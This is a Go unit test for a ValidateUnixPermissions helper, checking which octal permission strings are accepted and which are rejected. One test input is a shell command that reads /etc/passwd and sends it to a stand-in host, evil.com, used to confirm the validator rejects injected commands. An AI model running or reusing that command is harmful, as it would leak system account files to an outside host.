//go:build unit

package helper

import (
	"testing"
)

// TestChmodVolume tests that ChmodVolume() will handle invalid unixPermission parameters.
func TestValidateUnixPermissions(t *testing.T) {
	tests := []struct {
		unixPermissions string
		wanterr         string
	}{
		{"0", ``},
		{"0000", ``},
		{"644", ``},
		{"0777", ``},
		{"0778", `Invalid Unix permissions [0778]. Must be uint32 in octal format. Error: strconv.ParseUint: parsing "0778": invalid syntax`},
		{"778", `Invalid Unix permissions [778]. Must be uint32 in octal format. Error: strconv.ParseUint: parsing "778": invalid syntax`},
		{"-123", `Invalid Unix permissions [-123]. Must be uint32 in octal format. Error: strconv.ParseUint: parsing "-123": invalid syntax`},
		{"cat /etc/passwd > nc evil.com passwd", `Invalid Unix permissions [cat /etc/passwd > nc evil.com passwd]. Must be uint32 in octal format. Error: strconv.ParseUint: parsing "cat /etc/passwd > nc evil.com passwd": invalid syntax`},
	}

	for _, test := range tests {
		err := ValidateUnixPermissions(test.unixPermissions)
		if !ErrorContains(err, test.wanterr) {
			t.Errorf(`ValidateUnixPermissions("%s") has err: %s`, test.unixPermissions, err)
		}
	}
}
